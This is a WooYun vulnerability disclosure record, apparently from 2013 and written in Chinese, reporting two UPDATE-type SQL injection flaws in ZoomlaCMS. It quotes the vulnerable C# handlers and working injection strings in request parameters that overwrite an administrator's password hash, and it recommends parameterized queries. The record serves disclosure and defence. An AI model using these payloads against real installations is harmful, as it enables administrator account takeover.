{"id": 7248, "wybug_id": "wooyun-2013-046418", "wybug_title": "逐浪CMS通用型SQL注入6+7（update型）", "wybug_corp": "逐浪CMS", "wybug_author": "wefgod", "wybug_date": "2013-12-19 10:57", "wybug_open_date": "2013-12-24 10:57", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t1970-01-01：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t1970-02-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t1970-03-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t1970-03-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-24：\t细节向公众公开  简要描述： 好像没修复，友情来提交下。本来已经放弃了的 详细说明：  某功能还是存在两个UPDATE型注入，咱们可以秒改管理员密码。当然了也可以insert管理员的，为了避免一些问题就不用insert来测试了涉及的两个类：public class MIS_Project_ProQuote : Page, IRequiresSessionStatepublic class MIS_Target_mailQuote : Page, IRequiresSessionState   漏洞证明：  注入点1：代码如下\npublic class MIS_Project_ProQuote : Page, IRequiresSessionStateprotected void Button1_Click(object sender, EventArgs e)    {        if (!string.IsNullOrEmpty(base.Request[\"types\"]) && this.types == \"7\")        {            string text = base.Request[\"id\"].ToString(); //ID参数            string value = this.ProID.Value;            if (!string.IsNullOrEmpty(value))            {                this.mps = this.bll.SelectByType(DataConverter.CLng(value));                if (this.mps.TargetID.ToString() == \"\")                {                    this.HiddenField1.Value = text;  //将ID参数赋值给隐藏域                }                else                {                    this.HiddenField1.Value = this.mps.TargetID + \"|\" + text;                }                this.bll.Update(\"TargetID='\" + this.HiddenField1.Value + \"'\", \"ID='\" + DataConverter.CLng(value) + \"'\");  //隐藏域没有过滤直接带入更新的查询，产生漏洞                base.Response.Write(\"<script> location.href='Default.aspx?ID=\" + text + \"';</script>\");            }        }    }\n注册前台用户访问：http://demo.zoomla.cn/mis/target/proquote.aspx?types=7&id=1点击引用按钮改包\n\n\n\nProid输入随意的整数。将id修改为注入的代码：1';update zl_manager set adminpassword='77963b7a931377ad4ab5ad6a9cd718aa' where adminname='test123';--此处注入和之前的不太一样。实际上这里是hidden的参数有问题，但是由于hidden参数要二次从id赋值，所以只要改ID这个参数即可，直接改hidden是无效的。查看测试管理员密码已经被修改：\n\n注入点2：代码如下\npublic class MIS_Target_mailQuote : Page, IRequiresSessionState    protected void Button1_Click(object sender, EventArgs e)    {        string value = this.ProID.Value;        string str = string.Empty;        if (!string.IsNullOrEmpty(base.Request[\"types\"]) && base.Request[\"types\"] == \"8\")        {            if (!string.IsNullOrEmpty(base.Request[\"ID\"]))            {                str = base.Request[\"id\"].ToString(); //漏洞点，id参数无过滤            }            if (!string.IsNullOrEmpty(value))            {                this.bminfo.Update(\"MID=\" + str, \"ID=\" + DataConverter.CLng(value)); //str变量直接带入更新操作                if (!string.IsNullOrEmpty(base.Request[\"ParentID\"]))                {                    base.Response.Write(\"<script> window.Patent.location.reload(); </script>\");                    return;                }                base.Response.Write(\"<script>window.Patent.location.reload();</script>\");            }        }    }\n前台注册用户。http://demo.zoomla.cn/mis/target/mailquote.aspx?id=1;update zl_manager set adminpassword='08f8e0260c64418510cefb2b06eee5cd' where adminname='test123';--&types=8访问上面的链接后，点击引用！！！！截断一下然后改包，为下面的参数添加一个整型值：\n\n查看数据库，发现测试用的管理员密码已经被修改了\n\n   修复方案：  过滤，参数化查询。   版权声明：转载请注明来源 wefgod@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-12-24 10:57 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-19 12:00 |    \t\t小驴牙牙 \t\t\t( 普通白帽子  |\t\t\t        Rank:168 漏洞数:43        | 不断学习，进步！)\t\t \n  好太极    \n     2013-12-23 17:45 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  必定是忽略的节奏！    \n     2013-12-24 11:28 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @疯狗 狗哥，又公开鸟。    \n     2013-12-24 11:30 |    \t\t在路上 \t\t\t( 普通白帽子  |\t\t\t        Rank:193 漏洞数:13        | 在学习的路上、在成长的路上...)\t\t \n  @wefgod 狗哥会给你rmb的    \n     2013-12-24 11:32 |    \t\t阿布 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:5        )\t\t \n  狗哥会给你rmb的     \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}